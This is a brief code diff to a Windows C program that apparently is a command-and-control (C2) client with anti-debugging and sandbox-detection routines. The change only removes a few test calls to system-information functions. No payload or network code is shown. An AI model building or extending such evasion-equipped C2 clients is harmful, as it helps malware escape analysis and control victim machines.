@@ -220,10 +220,10 @@ void run_c2_client() {
     printf("========================================\n");
     InitAntiDebug();
     
-    // Test some API calls to verify monitoring is working
-    SafeGetSystemTime();
-    SafeGetModuleHandle();
-    SafeIsDebuggerPresent();
+    // Test some API calls to verify monitoring is working (Currently empty)
+ 
+
+
     
     // SANDBOX CHECK
     printf("\n========================================\n");
@@ -446,9 +446,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     InitAntiDebug();
     
     printf("\n--- Testing Anti-Debug Monitoring ---\n");
-    SafeGetSystemTime();
-    SafeGetComputerName();
-    SafeGetCurrentProcessId();
+
     
     printf("\n--- Running Sandbox Detection ---\n");
     int sandbox_result = check_sandbox();
